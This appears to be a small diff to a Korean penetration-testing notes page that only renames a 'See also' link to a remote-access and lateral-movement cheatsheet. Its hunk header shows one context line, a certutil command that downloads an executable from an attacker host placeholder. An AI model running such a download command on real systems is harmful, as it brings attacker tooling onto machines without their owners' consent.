@@ -83,7 +83,7 @@ certutil -urlcache -f http://$LHOST/tool.exe tool.exe
 
 ## 함께 보기
 
-- [원격접속·측면이동 치트시트](/notes/remote-access-lateral-cheatsheet/)
+- [원격접속·측면이동 도구 치트시트](/notes/remote-access-lateral-cheatsheet/)
 - [모의침투 작전 흐름](/notes/penetration-testing-operation-flow/)
 
 ## 참고 자료
